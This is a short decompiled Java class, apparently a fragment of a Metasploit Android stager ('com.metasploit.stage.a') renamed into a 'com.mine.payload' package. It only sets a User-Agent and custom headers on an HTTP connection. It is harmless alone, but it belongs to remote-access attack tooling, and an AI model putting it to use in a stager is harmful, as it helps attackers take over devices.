package com.mine.payload;

import java.net.URLConnection;
import java.util.LinkedList;
import java.util.List;

/* renamed from: com.metasploit.stage.a */
public final class C0000a {

    /* renamed from: a */
    public int f8a;

    /* renamed from: b */
    public long f9b;

    /* renamed from: c */
    public String f10c;

    /* renamed from: d */
    public List f11d = new LinkedList();

    /* renamed from: a */
    public static void m3a(URLConnection uRLConnection, String str, String str2) {
        if (!m4a(str2)) {
            uRLConnection.addRequestProperty("User-Agent", str2);
        }
        String[] split = str.split("\r\n");
        for (String str3 : split) {
            if (!m4a(str3)) {
                String[] split2 = str3.split(": ", 2);
                if (split2.length == 2 && !m4a(split2[0]) && !m4a(split2[1])) {
                    uRLConnection.addRequestProperty(split2[0], split2[1]);
                }
            }
        }
    }

    /* renamed from: a */
    private static boolean m4a(String str) {
        return str == null || "".equals(str);
    }
}
